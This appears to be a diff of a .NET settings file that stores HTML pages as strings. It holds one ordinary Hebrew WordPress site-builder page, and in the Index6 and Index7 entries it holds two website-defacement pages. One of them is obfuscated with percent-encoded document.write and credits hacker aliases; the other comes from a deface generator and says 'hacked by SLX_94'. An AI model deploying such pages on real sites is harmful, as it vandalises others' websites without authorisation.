+        &lt;section class="footer-rigth"&gt;
+                    &lt;/section&gt;        
+        &lt;section class="footer-left"&gt;
+            &lt;ul id="menu-menu-footer-2" class="menu accessibility_menu"&gt;&lt;li id="menu-item-240" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-privacy-policy menu-item-240"&gt;&lt;a rel="privacy-policy" href="https://builder.dev.site-pro.co.il/privacy-policy/"&gt;תנאי שימוש&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;        &lt;/section&gt;
+	&lt;/footer&gt;
+	
+	
+&lt;div id="modalCreatePage" &gt;
+    &lt;div class="modal-content"&gt;
+        &lt;p&gt;לורם איפסום דולור סיט אמט, קונסקטורר אדיפיסינג אלית גולר מונפרר סוברט לורם שבצק יהול, לכנוץ בעריר גק ליץ, לורם איפסום דולור סיט אמט, קונסקטורר אדיפיסינג אלית. סת אלמנקום ניסי נון ניבאה.&lt;/p&gt;
+        &lt;div&gt;
+            &lt;p class="close-modal"&gt;המשך&lt;/p&gt;
+            &lt;form class="tariff-link" action="/בחירת-תוכנית/" method="post"&gt;  
+                &lt;input type="hidden" id="userpages" name="userpages" value="" &gt;
+                &lt;p&gt;&lt;input type="submit" name="submit" class="button-create-update" value="בחירת תוכנית" /&gt;&lt;/p&gt;
+            &lt;/form&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+          
+&lt;/div&gt;
+	
+&lt;style&gt;
+    
+
+            #open_sogoacc {
+                background: #0780C3;
+                color: #FFF;
+                border-bottom: 1px solid #0780C3;
+                border-right: 1px solid #0780C3;
+            }
+
+            #close_sogoacc {
+                background: #0780C3;
+                color: #fff;
+            }
+
+            #sogoacc div#sogo_font_a button {
+                color: #0780C3;
+
+            }
+
+            body.sogo_readable_font * {
+                font-family:  !important;
+            }
+
+            body.sogo_underline_links a {
+                text-decoration: underline !important;
+            }
+
+    
+
+&lt;/style&gt;
+
+
+&lt;div id="sogo_overlay"&gt;&lt;/div&gt;
+
+&lt;button id="open_sogoacc"
+   aria-label="לחץ &amp;quot;ALT+A&amp;quot; בכדי לפתוח \ לסגור את תפריט הנגישות"
+   tabindex="1"
+   accesskey="a" class="topright toggle_sogoacc"&gt;&lt;i style="font-size: 30px" class="fa fa-universal-access"  &gt;&lt;/i&gt;&lt;/button&gt;
+&lt;div id="sogoacc" class="topright"&gt;
+    &lt;div id="close_sogoacc"
+         class="toggle_sogoacc"&gt;נגישות&lt;/div&gt;
+    &lt;div class="sogo-btn-toolbar" role="toolbar"&gt;
+        &lt;div class="sogo-btn-group"&gt;
+						                &lt;button type="button" id="b_n_c" class="btn btn-default"&gt;
+                    &lt;span class="sogo-icon-black_and_white" aria-hidden="true"&gt;&lt;/span&gt;
+					שחור לבן&lt;/button&gt;
+						                &lt;button type="button" id="contrasts"
+                        data-css="https://builder.dev.site-pro.co.il/wp-content/plugins/sogo-accessibility/public//css/sogo_contrasts.css"
+                        class="btn btn-default"&gt;
+                    &lt;span class="sogo-icon sogo-icon-black" aria-hidden="true"&gt;&lt;/span&gt;
+					חדות כהה &lt;/button&gt;
+						                &lt;button type="button" id="contrasts_white"
+                        data-css="https://builder.dev.site-pro.co.il/wp-content/plugins/sogo-accessibility/public//css/sogo_contrasts_white.css"
+                        class="btn btn-default"&gt;
+                    &lt;span class="sogo-icon-white" aria-hidden="true"&gt;&lt;/span&gt;
+					חדות בהירה&lt;/button&gt;
+						                &lt;button type="button" id="animation_off" class="btn btn-default" &gt;
+                    &lt;span class="sogo-icon-flash" aria-hidden="true"&gt;&lt;/span&gt;
+					הפסק הבהובים&lt;/button&gt;
+						                &lt;button type="button" id="readable_font" class="btn btn-default"&gt;
+                    &lt;span class="sogo-icon-font" aria-hidden="true"&gt;&lt;/span&gt;
+					פונט קריא&lt;/button&gt;
+						                &lt;button type="button" id="underline_links" class="btn btn-default"&gt;
+                    &lt;span class="sogo-icon-link" aria-hidden="true"&gt;&lt;/span&gt;
+					הדגש קישורים&lt;/button&gt;
+			
+
+        &lt;/div&gt;
+        &lt;div id="sogo_font_a" class="sogo-btn-group clearfix"&gt;
+            &lt;button id="sogo_a1" data-size="1" type="button"
+                    class="btn btn-default " aria-label="Press to increase font size"&gt;א&lt;/button&gt;
+            &lt;button id="sogo_a2" data-size="" type="button"
+                    class="btn btn-default" Press to increase font size"&gt;א&lt;/button&gt;
+            &lt;button id="sogo_a3" data-size="" type="button"
+                    class="btn btn-default" Press to increase font size"&gt;א&lt;/button&gt;
+        &lt;/div&gt;
+        &lt;div class="accessibility-info"&gt;
+
+            &lt;div&gt;&lt;a   id="sogo_accessibility"
+                    href="#"&gt;&lt;i aria-hidden="true" class="fa fa-times-circle-o red " &gt;&lt;/i&gt;הפסק נגישות                &lt;/a&gt;
+            &lt;/div&gt;
+            &lt;div&gt;
+													            &lt;/div&gt;
+
+
+        &lt;/div&gt;
+
+
+    &lt;/div&gt;
+	        &lt;div class="sogo-logo"&gt;
+            &lt;a target="_blank" href="https://pluginsmarket.com/downloads/accessibility-plugin/"
+               title="Provided by sogo.co.il"&gt;
+                &lt;span&gt;מסופק ע"י: &lt;/span&gt;
+                &lt;img src="https://builder.dev.site-pro.co.il/wp-content/plugins/sogo-accessibility/public/css/sogo-logo.png" alt="sogo logo"/&gt;
+
+            &lt;/a&gt;
+        &lt;/div&gt;
+	&lt;/div&gt;&lt;script type='text/javascript' id='contact-form-7-js-extra'&gt;
+/* &lt;![CDATA[ */
+var wpcf7 = {"apiSettings":{"root":"https:\/\/builder.dev.site-pro.co.il\/wp-json\/contact-form-7\/v1","namespace":"contact-form-7\/v1"}};
+/* ]]&gt; */
+&lt;/script&gt;
+&lt;script type='text/javascript' src='https://builder.dev.site-pro.co.il/wp-content/plugins/contact-form-7/includes/js/scripts.js?ver=5.3.2' id='contact-form-7-js'&gt;&lt;/script&gt;
+&lt;script type='text/javascript' src='https://builder.dev.site-pro.co.il/wp-content/plugins/sogo-accessibility/public/js/navigation.js?ver=1.0.5' id='sogo_accessibility.navigation-js'&gt;&lt;/script&gt;
+&lt;script type='text/javascript' src='https://builder.dev.site-pro.co.il/wp-content/plugins/sogo-accessibility/public/js/sogo-accessibility-public.js?ver=1.0.5' id='sogo_accessibility-js'&gt;&lt;/script&gt;
+&lt;script type='text/javascript' src='https://builder.dev.site-pro.co.il/wp-content/plugins/woocommerce/assets/js/jquery-blockui/jquery.blockUI.min.js?ver=2.70' id='jquery-blockui-js'&gt;&lt;/script&gt;
+&lt;script type='text/javascript' id='wc-add-to-cart-js-extra'&gt;
+/* &lt;![CDATA[ */
+var wc_add_to_cart_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_view_cart":"\u05de\u05e2\u05d1\u05e8 \u05dc\u05e1\u05dc \u05d4\u05e7\u05e0\u05d9\u05d5\u05ea","cart_url":"https:\/\/builder.dev.site-pro.co.il\/?page_id=179","is_cart":"","cart_redirect_after_add":"no"};
+/* ]]&gt; */
+&lt;/script&gt;
+&lt;script type='text/javascript' src='https://builder.dev.site-pro.co.il/wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.min.js?ver=5.2.5' id='wc-add-to-cart-js'&gt;&lt;/script&gt;
+&lt;script type='text/javascript' src='https://builder.dev.site-pro.co.il/wp-content/plugins/woocommerce/assets/js/js-cookie/js.cookie.min.js?ver=2.1.4' id='js-cookie-js'&gt;&lt;/script&gt;
+&lt;script type='text/javascript' id='woocommerce-js-extra'&gt;
+/* &lt;![CDATA[ */
+var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%"};
+/* ]]&gt; */
+&lt;/script&gt;
+&lt;script type='text/javascript' src='https://builder.dev.site-pro.co.il/wp-content/plugins/woocommerce/assets/js/frontend/woocommerce.min.js?ver=5.2.5' id='woocommerce-js'&gt;&lt;/script&gt;
+&lt;script type='text/javascript' id='wc-cart-fragments-js-extra'&gt;
+/* &lt;![CDATA[ */
+var wc_cart_fragments_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","cart_hash_key":"wc_cart_hash_d7678a5e4d1370471d2f1c321d4249b4","fragment_name":"wc_fragments_d7678a5e4d1370471d2f1c321d4249b4","request_timeout":"5000"};
+/* ]]&gt; */
+&lt;/script&gt;
+&lt;script type='text/javascript' src='https://builder.dev.site-pro.co.il/wp-content/plugins/woocommerce/assets/js/frontend/cart-fragments.min.js?ver=5.2.5' id='wc-cart-fragments-js'&gt;&lt;/script&gt;
+
+&lt;script&gt;
+var _radio = this; 
+setTimeout(function() {
+  $(_radio).prop("checked", !_radio.checked).trigger("change");
+});
+&lt;/script&gt;
+
+&lt;script&gt;
+var radios = document.getElementsByClassName('radio-template-color');
+var resetRadios = document.getElementById('reset-radio-template-color');
+resetRadios.onclick = function() {
+    for(i=0; i&lt;radios.length; i++ ) {
+        radios[i].checked = false;
+    }
+}
+
+&lt;/script&gt;
+
+&lt;script&gt;
+var modalCreatePage = document.getElementById("modalCreatePage");
+var createButton = document.getElementById("header_create_button");
+var closeModalCreatePage = document.getElementsByClassName("close-modal")[0];
+createButton.onclick = function() {
+  modalCreatePage.style.display = "block";
+}
+closeModalCreatePage.onclick = function() {
+  modalCreatePage.style.display = "none";
+}
+&lt;/script&gt;    
+
+&lt;script&gt;
+window.onload = function(){ 
+var onbutton1 = document.getElementById("button_on_desc");
+onbutton1.onclick = function() {
+    document.getElementById("desc_block").style.display = "block";
+    document.getElementById("desc_h2").value = "1";
+    this.style.display = "none";
+}
+var onbutton2 = document.getElementById("button_on_logo");
+onbutton2.onclick = function() {
+    document.getElementById("logo_block").style.display = "block";
+    document.getElementById("logo_h2").value = "1";
+    this.style.display = "none";
+}
+var onbutton3 = document.getElementById("button_on_name");
+onbutton3.onclick = function() {
+    document.getElementById("name_block").style.display = "block";
+    document.getElementById("name_h2").value = "1";
+    this.style.display = "none";
+}
+var onbutton4 = document.getElementById("button_on_contact");
+onbutton4.onclick = function() {
+    document.getElementById("contact_block").style.display = "block";
+    document.getElementById("contact_h2").value = "1";
+    this.style.display = "none";
+}
+var onbutton5 = document.getElementById("button_on_gallery");
+onbutton5.onclick = function() {
+    document.getElementById("gallery_block").style.display = "block";
+    document.getElementById("gallery_h2").value = "1";
+    this.style.display = "none";
+}
+
+
+var onbuttonclose1 = document.getElementById("close-desc");
+onbuttonclose1.onclick = function() {
+    var div = this.parentElement;
+    div.style.display = "none";
+    var c = this.children;
+  c[0].value = "0";
+    let buttonOnDesc = document.getElementById("button_on_desc");
+   buttonOnDesc.style.display = "block";
+}
+
+var onbuttonclose2 = document.getElementById("close-logo");
+onbuttonclose2.onclick = function() {
+    var div = this.parentElement;
+    div.style.display = "none";
+    var c = this.children;
+  c[0].value = "0";
+    let buttonOnLogo = document.getElementById("button_on_logo");
+   buttonOnLogo.style.display = "block";
+}
+
+var onbuttonclose3 = document.getElementById("close-name");
+onbuttonclose3.onclick = function() {
+    var div = this.parentElement;
+    div.style.display = "none";
+    var c = this.children;
+  c[0].value = "0";
+    let buttonOnName = document.getElementById("button_on_name");
+   buttonOnName.style.display = "block";
+}
+
+var onbuttonclose4 = document.getElementById("close-contact");
+onbuttonclose4.onclick = function() {
+    var div = this.parentElement;
+    div.style.display = "none";
+    var c = this.children;
+  c[0].value = "0";
+    let buttonOnContact = document.getElementById("button_on_contact");
+   buttonOnContact.style.display = "block";
+}
+var onbuttonclose4 = document.getElementById("close-gallery");
+onbuttonclose4.onclick = function() {
+    var div = this.parentElement;
+    div.style.display = "none";
+    var c = this.children;
+  c[0].value = "0";
+    let buttonOnGallery = document.getElementById("button_on_gallery");
+   buttonOnGallery.style.display = "block";
+}
+}
+
+/* Click on a close button to hide the current list item
+var close = document.getElementsByClassName("close");
+var i;
+for (i = 0; i &lt; close.length; i++) {
+  close[i].onclick = function() {
+    var div = this.parentElement;
+    div.style.display = "none";
+    var c = this.children;
+  c[0].value = "0";
+  //c[1].value = "1000";
+  }
+}
+*/
+
+&lt;/script&gt;
+
+&lt;script&gt;
+
+let delBgPicture = document.getElementById("delete-picture");
+delBgPicture.onclick = function() {
+    let bgPicture = document.getElementById("background_save");
+    let imgBg = document.getElementById("img_bg");
+    bgPicture.value = "";
+    imgBg.style.display = "none";
+    this.style.display = "none";
+}
+
+&lt;/script&gt;
+&lt;script&gt;
+
+let delBgPicture0 = document.getElementById("delete-picture0");
+delBgPicture0.onclick = function() {
+    let bgPicture0 = document.getElementById("background_save0");
+    let imgBg0 = document.getElementById("img_bg0");
+    bgPicture0.value = "";
+    imgBg0.style.display = "none";
+    this.style.display = "none";
+}
+
+&lt;/script&gt;
+
+&lt;script&gt;
+let delBgPictureLogo = document.getElementById("delete-picture-logo");
+delBgPictureLogo.onclick = function() {
+    let bgPictureLogo = document.getElementById("background_save_logo");
+    let imgBgLogo = document.getElementById("img_bg_logo");
+    bgPictureLogo.value = "";
+    imgBgLogo.style.display = "none";
+    this.style.display = "none";
+}
+&lt;/script&gt;
+
+&lt;script&gt;
+
+let addImageGalleryButton = document.getElementById("add_image_gallery");
+function checkAddImageGalleryButton () {
+    /* let galleryImage1 = document.getElementById("gallery_image1_save");
+    let galleryImage2 = document.getElementById("gallery_image2_save");
+    let galleryImage3 = document.getElementById("gallery_image3_save");
+    let galleryImage4 = document.getElementById("gallery_image4_save");
+    let galleryImage5 = document.getElementById("gallery_image5_save");
+    let galleryImage6 = document.getElementById("gallery_image6_save");
+    
+    if (galleryImage1.value == "" || galleryImage2.value == "" || galleryImage3.value == "" || galleryImage4.value == "" || galleryImage5.value == "" || galleryImage6.value == "" ) addImageGalleryButton.style.display = "block";
+        else addImageGalleryButton.style.display = "none";*/
+        
+    let pictureBlock1 = document.getElementById("gallery_image1_block");
+    let pictureBlock2 = document.getElementById("gallery_image2_block");
+    let pictureBlock3 = document.getElementById("gallery_image3_block");
+    let pictureBlock4 = document.getElementById("gallery_image4_block");
+    let pictureBlock5 = document.getElementById("gallery_image5_block");
+    let pictureBlock6 = document.getElementById("gallery_image6_block");
+    
+    if (pictureBlock1.style.display == "block" &amp;&amp; pictureBlock2.style.display == "block" &amp;&amp; pictureBlock3.style.display == "block" &amp;&amp; pictureBlock4.style.display == "block" &amp;&amp; pictureBlock5.style.display == "block" &amp;&amp; pictureBlock6.style.display == "block" ) addImageGalleryButton.style.display = "none";
+        else addImageGalleryButton.style.display = "block";
+}
+
+
+
+    let galleryImage1 = document.getElementById("gallery_image1_save");
+    let galleryImage2 = document.getElementById("gallery_image2_save");
+    let galleryImage3 = document.getElementById("gallery_image3_save");
+    let galleryImage4 = document.getElementById("gallery_image4_save");
+    let galleryImage5 = document.getElementById("gallery_image5_save");
+    let galleryImage6 = document.getElementById("gallery_image6_save");
+    
+    let pictureBlock1 = document.getElementById("gallery_image1_block");
+    let pictureBlock2 = document.getElementById("gallery_image2_block");
+    let pictureBlock3 = document.getElementById("gallery_image3_block");
+    let pictureBlock4 = document.getElementById("gallery_image4_block");
+    let pictureBlock5 = document.getElementById("gallery_image5_block");
+    let pictureBlock6 = document.getElementById("gallery_image6_block");
+    
+    if (galleryImage1.value == "") pictureBlock1.style.display = "none"; else pictureBlock1.style.display = "block";
+    if (galleryImage2.value == "") pictureBlock2.style.display = "none"; else pictureBlock2.style.display = "block";
+    if (galleryImage3.value == "") pictureBlock3.style.display = "none"; else pictureBlock3.style.display = "block";
+    if (galleryImage4.value == "") pictureBlock4.style.display = "none"; else pictureBlock4.style.display = "block";
+    if (galleryImage5.value == "") pictureBlock5.style.display = "none"; else pictureBlock5.style.display = "block";
+    if (galleryImage6.value == "") pictureBlock6.style.display = "none"; else pictureBlock6.style.display = "block";
+    
+    checkAddImageGalleryButton();
+
+
+
+addImageGalleryButton.onclick = function() {
+    let pictureBlock1 = document.getElementById("gallery_image1_block");
+    let pictureBlock2 = document.getElementById("gallery_image2_block");
+    let pictureBlock3 = document.getElementById("gallery_image3_block");
+    let pictureBlock4 = document.getElementById("gallery_image4_block");
+    let pictureBlock5 = document.getElementById("gallery_image5_block");
+    let pictureBlock6 = document.getElementById("gallery_image6_block");
+    
+    if (pictureBlock1.style.display == "none")  pictureBlock1.style.display = "block";  
+        else if (pictureBlock2.style.display == "none") pictureBlock2.style.display = "block";
+            else if (pictureBlock3.style.display == "none") pictureBlock3.style.display = "block";
+                else if (pictureBlock4.style.display == "none") pictureBlock4.style.display = "block";
+                    else if (pictureBlock5.style.display == "none") pictureBlock5.style.display = "block";
+                        else if (pictureBlock6.style.display == "none") pictureBlock6.style.display = "block";
+    checkAddImageGalleryButton();
+}
+
+
+let delPicture1 = document.getElementById("delete-picture1");
+delPicture1.onclick = function() {
+    let pictureBlock1 = document.getElementById("gallery_image1_block");
+    let galleryImage1 = document.getElementById("gallery_image1_save");
+    galleryImage1.value = "";
+    pictureBlock1.style.display = "none";
+    checkAddImageGalleryButton();
+}
+let delPicture2 = document.getElementById("delete-picture2");
+delPicture2.onclick = function() {
+    let pictureBlock2 = document.getElementById("gallery_image2_block");
+    let galleryImage2 = document.getElementById("gallery_image2_save");
+    galleryImage2.value = "";
+    pictureBlock2.style.display = "none";
+    checkAddImageGalleryButton();
+}
+let delPicture3 = document.getElementById("delete-picture3");
+delPicture3.onclick = function() {
+    let pictureBlock3 = document.getElementById("gallery_image3_block");
+    let galleryImage3 = document.getElementById("gallery_image3_save");
+    galleryImage3.value = "";
+    pictureBlock3.style.display = "none";
+    checkAddImageGalleryButton();
+}
+let delPicture4 = document.getElementById("delete-picture4");
+delPicture4.onclick = function() {
+    let pictureBlock4 = document.getElementById("gallery_image4_block");
+    let galleryImage4 = document.getElementById("gallery_image4_save");
+    galleryImage4.value = "";
+    pictureBlock4.style.display = "none";
+    checkAddImageGalleryButton();
+}
+let delPicture5 = document.getElementById("delete-picture5");
+delPicture5.onclick = function() {
+    let pictureBlock5 = document.getElementById("gallery_image5_block");
+    let galleryImage5 = document.getElementById("gallery_image5_save");
+    galleryImage5.value = "";
+    pictureBlock5.style.display = "none";
+    checkAddImageGalleryButton();
+}
+let delPicture6 = document.getElementById("delete-picture6");
+delPicture6.onclick = function() {
+    let pictureBlock6 = document.getElementById("gallery_image6_block");
+    let galleryImage6 = document.getElementById("gallery_image6_save");
+    galleryImage6.value = "";
+    pictureBlock6.style.display = "none";
+    checkAddImageGalleryButton();
+}
+
+
+
+&lt;/script&gt;
+
+
+
+
+
+&lt;script&gt;
+var acc = document.getElementsByClassName("accordion");
+var i;
+
+for (i = 0; i &lt; acc.length; i++) {
+  acc[i].addEventListener("click", function() {
+    this.classList.toggle("active");
+    var panel = this.nextElementSibling;
+    if (panel.style.display === "block") {
+      panel.style.display = "none";
+    } else {
+      panel.style.display = "block";
+    }
+  });
+}
+&lt;/script&gt;
+
+
+&lt;script&gt;
+window.onload = function(){ 
+var modal = document.getElementById("myModal");
+var btn = document.getElementById("myBtn");
+var span = document.getElementsByClassName("closem")[0];
+btn.onclick = function() {
+  modal.style.display = "block";
+}
+span.onclick = function() {
+  modal.style.display = "none";
+}
+window.onclick = function(event) {
+  if (event.target == modal) {
+    modal.style.display = "none";
+  }
+}
+
+}
+&lt;/script&gt;
+
+
+&lt;script&gt;
+		;( function ( document, window, index )
+{
+	var inputs = document.querySelectorAll( '.inputfile' );
+	Array.prototype.forEach.call( inputs, function( input )
+	{
+		var label	 = input.nextElementSibling,
+			labelVal = label.innerHTML;
+
+		input.addEventListener( 'change', function( e )
+		{
+			var fileName = '';
+			if( this.files &amp;&amp; this.files.length &gt; 1 )
+				fileName = ( this.getAttribute( 'data-multiple-caption' ) || '' ).replace( '{count}', this.files.length );
+			else
+				fileName = e.target.value.split( '\\' ).pop();
+
+			if( fileName )
+				label.querySelector( 'span' ).innerHTML = fileName;
+			else
+				label.innerHTML = labelVal;
+		});
+
+		// Firefox bug fix
+		input.addEventListener( 'focus', function(){ input.classList.add( 'has-focus' ); });
+		input.addEventListener( 'blur', function(){ input.classList.remove( 'has-focus' ); });
+	});
+}( document, window, 0 ));
+		&lt;/script&gt;
+		
+		
+&lt;script&gt;
+
+window.onscroll = function() {myFunction2()};
+
+var navbar = document.getElementById("navbar");
+var sticky = navbar.offsetTop;
+
+function myFunction2() {
+  if (window.pageYOffset &gt;= sticky) {
+    navbar.classList.add("sticky")
+  } else {
+    navbar.classList.remove("sticky");
+  }
+}
+
+&lt;/script&gt;
+
+
+&lt;script type="text/javascript"&gt; 
+function confirmReset() {
+    
+  if (confirm("Are you sure you want to submit the form?")) {
+    document.getElementById("form-main").submit();
+  }
+  else event.preventDefault();
+}
+&lt;/script&gt;
+
+&lt;script&gt; 
+function confirmDelete() {
+    if (confirm("Are you sure you want to submit the form?")) { 
+        document.getElementById("delete_uder_page").submit(); 
+    } else event.preventDefault(); 
+} 
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</Value>
+    </Setting>
+    <Setting Name="Index6" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+&lt;script type="text/javascript"&gt;
+&lt;!-- Yamaap Udah Gua Encrypt :v --&gt;
+&lt;!--
+document.write(unescape('%3c%68%74%6d%6c%3e%3c%74%69%74%6c%65%3e%3a%3a%3a%20%47%61%79%41%6e%6f%6e%5f%57%75%5a%7e%48%65%52%65%20%3a%3a%3a%3c%2f%74%69%74%6c%65%3e%3c%6d%65%74%61%20%6e%61%6d%65%3d%22%76%69%65%77%70%6f%72%74%22%20%63%6f%6e%74%65%6e%74%3d%22%77%69%64%74%68%3d%64%65%76%69%63%65%2d%77%69%64%74%68%2c%20%69%6e%69%74%69%61%6c%2d%73%63%61%6c%65%3d%31%2e%30%22%5c%3e%3c%6d%65%74%61%20%6e%61%6d%65%3d%22%63%6f%6e%74%65%6e%74%22%20%64%65%73%63%72%69%70%74%69%6f%6e%3d%22%3a%3a%3a%20%47%61%79%41%6e%6f%6e%5f%57%75%5a%7e%48%65%52%65%20%3a%3a%3a%22%5c%3e%3c%6d%65%74%61%20%6e%61%6d%65%3d%22%63%6f%6e%74%65%6e%74%22%20%6b%65%79%77%6f%72%64%73%3d%22%3a%3a%3a%20%47%61%79%41%6e%6f%6e%5f%57%75%5a%7e%48%65%52%65%20%3a%3a%3a%22%5c%3e%3c%6c%69%6e%6b%20%68%72%65%66%3d%22%68%74%74%70%73%3a%2f%2f%66%6f%6e%74%73%2e%67%6f%6f%67%6c%65%61%70%69%73%2e%63%6f%6d%2f%63%73%73%32%3f%66%61%6d%69%6c%79%3d%4a%6f%6c%6c%79%2b%4c%6f%64%67%65%72%26%66%61%6d%69%6c%79%3d%4d%6f%6e%74%73%65%72%72%61%74%26%64%69%73%70%6c%61%79%3d%73%77%61%70%22%20%72%65%6c%3d%22%73%74%79%6c%65%73%68%65%65%74%22%3e%3c%68%65%61%64%3e%3c%73%74%79%6c%65%3e%20%2a%20%7b%20%70%61%64%64%69%6e%67%3a%20%35%70%78%3b%20%6d%61%72%67%69%6e%3a%20%35%70%78%3b%20%7d%20%62%6f%64%79%20%7b%20%62%61%63%6b%67%72%6f%75%6e%64%2d%69%6d%61%67%65%3a%20%75%72%6c%28%22%68%74%74%70%73%3a%2f%2f%69%2e%70%69%6e%69%6d%67%2e%63%6f%6d%2f%6f%72%69%67%69%6e%61%6c%73%2f%33%66%2f%37%63%2f%32%65%2f%33%66%37%63%32%65%35%31%64%35%66%37%35%62%65%61%62%65%63%36%65%35%38%30%33%35%35%31%64%63%38%30%2e%67%69%66%22%29%3b%20%68%65%69%67%68%74%3a%20%31%30%30%25%3b%20%62%61%63%6b%67%72%6f%75%6e%64%2d%70%6f%73%69%74%69%6f%6e%3a%20%63%65%6e%74%65%72%3b%20%62%61%63%6b%67%72%6f%75%6e%64%2d%72%65%70%65%61%74%3a%20%6e%6f%2d%72%65%70%65%61%74%3b%20%62%61%63%6b%67%72%6f%75%6e%64%2d%73%69%7a%65%3a%20%63%6f%76%65%72%3b%20%7d%20%68%31%20%7b%20%74%65%78%74%2d%61%6c%69%67%6e%3a%20%63%65%6e%74%65%72%3b%20%66%6f%6e%74%2d%66%61%6d%69%6c%79%3a%20%4a%6f%6c%6c%79%20%4c%6f%64%67%65%72%2c%20%63%75%72%73%69%76%65%3b%20%63%6f%6c%6f%72%3a%20%72%65%64%3b%20%7d%20%62%67%68%31%20%7b%20%62%61%63%6b%67%72%6f%75%6e%64%3a%20%77%68%69%74%65%3b%20%62%6f%72%64%65%72%3a%20%32%70%78%20%73%6f%6c%69%64%20%72%65%64%3b%20%62%6f%72%64%65%72%2d%72%61%64%69%75%73%3a%20%31%30%70%78%3b%20%70%61%64%64%69%6e%67%3a%20%31%30%70%78%3b%20%7d%20%66%6f%6e%74%32%20%7b%20%63%6f%6c%6f%72%3a%20%77%68%69%74%65%3b%20%66%6f%6e%74%2d%66%61%6d%69%6c%79%3a%20%4d%6f%6e%74%73%65%72%72%61%74%2c%20%73%61%6e%73%2d%73%65%72%69%66%3b%20%7d%3c%2f%73%74%79%6c%65%3e%3c%2f%68%65%61%64%3e%3c%62%6f%64%79%3e%3c%68%31%3e%3c%62%67%68%31%3e%3a%3a%3a%20%47%61%79%41%6e%6f%6e%5f%57%75%5a%7e%48%65%52%65%20%3a%3a%3a%3c%2f%62%67%68%31%3e%3c%2f%68%31%3e%3c%62%72%3e%3c%63%65%6e%74%65%72%3e%3c%69%6d%67%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%69%2e%69%62%62%2e%63%6f%2f%77%72%76%53%43%48%48%2f%32%30%32%32%31%31%31%36%2d%32%32%33%30%34%31%2e%6a%70%67%22%20%77%69%64%74%68%3d%22%31%37%30%70%78%22%20%68%65%69%67%68%74%3d%22%31%35%30%70%78%22%20%61%6c%74%3d%22%4c%6f%67%6f%47%61%79%41%6e%6f%6e%22%20%5c%3e%3c%2f%63%65%6e%74%65%72%3e%3c%62%72%3e%3c%66%6f%6e%74%32%3e%3c%63%65%6e%74%65%72%3e%54%68%61%6e%6b%73%20%41%6c%6c%20%3a%3c%62%72%3e%4d%69%73%73%50%72%6f%78%79%20%2d%20%4d%72%2e%34%6e%67%67%65%72%20%2d%20%4c%61%6c%61%43%65%70%65%72%20%2d%20%4d%33%6e%64%30%77%34%6e%20%2d%20%43%79%62%33%72%63%6c%34%79%2e%67%6f%2e%69%64%20%2d%20%48%69%6a%61%62%65%72%73%20%2d%20%52%2e%52%34%4d%34%44%48%34%4e%20%2d%20%47%68%7a%37%20%2d%20%4d%72%2e%57%34%68%79%75%20%2d%20%52%69%7a%6b%69%40%4d%69%73%74%65%72%69%7a%34%30%34%20%2d%20%4d%72%2e%42%6f%6f%64%72%6f%6f%74%20%2d%20%44%69%63%6b%79%20%2d%20%2e%2f%5a%65%74%34%30%34%20%3c%2f%63%65%6e%74%65%72%3e%3c%2f%66%6f%6e%74%32%3e%3c%2f%62%6f%64%79%3e%3c%2f%68%74%6d%6c%3e'));
+//--&gt;
+&lt;/script&gt;</Value>
+    </Setting>
+    <Setting Name="Index7" Type="System.String" Scope="User">
+      <Value Profile="(Default)">
+
+&lt;!--
+--  Downloaded from : https://haxor.my.id/save/myscd.html
+--  Official Web : https://prinsh.com
+--  script-deface-generator.prinsh.com
+--&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;link href="https://fonts.googleapis.com/css?family=VT323:wght@300&amp;amp;display=swap" rel="stylesheet"&gt;
+		&lt;link href="https://fonts.googleapis.com/css?family=VT323|New+Rocker" rel="stylesheet"&gt;
+		&lt;title&gt;Diretas oleh SLX_94 &lt;/title&gt;
+		&lt;meta name="description" 
+&lt;meta property="og:image" content="https://cdn.pixabay.com/photo/2023/01/12/21/11/clown-7714881_640.jpg " 
+
+content="THIS IS MASSAGE FOR YOU"&gt;
+		&lt;style type="text/css"&gt;
+			body {
+				background-color: white;
+				font-family: Kelly Slab;
+			}
+			.lagu{ 
+				background:transparent; 
+				border:2px solid black; 
+				border-radius:13px; 
+				text-align: center; 
+				font-family:Kelly Slab; 
+				color:black; 
+				font-size:18x; 
+				font-weight:; 
+				padding:3px 29px; 
+				text-decoration:none; 
+			}
+			
+		&lt;/style&gt;
+		&lt;script type="text/javascript"&gt;
+		
+		var snowmax=35
+		var snowcolor=new Array("black")
+		var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS")
+		var snowletter="*"
+		var sinkspeed=0.6
+		var snowmaxsize=22
+		var snowminsize=8
+		var snowingzone=1
+		
+		// Do not edit below this line
+		var snow=new Array()
+		var marginbottom
+		var marginright
+		var timer
+		var i_snow=0
+		var x_mv=new Array();
+		var crds=new Array();
+		var lftrght=new Array();
+		var browserinfos=navigator.userAgent 
+		var ie5=document.all&amp;&amp;document.getElementById&amp;&amp;!browserinfos.match(/Opera/)
+		var ns6=document.getElementById&amp;&amp;!document.all
+		var opera=browserinfos.match(/Opera/)  
+		var browserok=ie5||ns6||opera
+		
+		function randommaker(range) {		
+		rand=Math.floor(range*Math.random())
+		return rand
+		}
+		
+		function initsnow() {
+		if (ie5 || opera) {
+		marginbottom = document.body.clientHeight
+		marginright = document.body.clientWidth
+		}
+		else if (ns6) {
+		marginbottom = window.innerHeight
+		marginright = window.innerWidth
+		}
+		var snowsizerange=snowmaxsize-snowminsize
+		for (i=0;i&lt;=snowmax;i++) {
+		crds[i] = 0;                      
+		lftrght[i] = Math.random()*15;         
+		x_mv[i] = 0.03 + Math.random()/10;
+		snow[i]=document.getElementById("s"+i)
+		snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
+		snow[i].size=randommaker(snowsizerange)+snowminsize
+		snow[i].style.fontSize=snow[i].size
+		snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
+		snow[i].sink=sinkspeed*snow[i].size/5
